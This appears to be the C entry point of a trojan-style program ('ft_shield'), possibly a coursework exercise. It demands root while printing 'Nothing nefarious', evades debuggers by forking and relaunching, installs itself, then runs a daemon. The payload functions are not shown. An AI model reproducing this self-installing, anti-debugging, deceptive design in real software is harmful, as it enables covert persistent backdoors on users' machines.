#include <unistd.h>
#include <stdio.h>

#include "ft_shield.h"

int main()
{
    if (geteuid() != 0)
    {
        printf("Please run as root =). Nothing nefarious.\n");
        return 1;
    }
    if (detect_debugging())
        fork_and_relaunch();

    if (!is_installed())
    {
        install_self();
        return 0;
    }

    run_daemon();

    return 0;
}
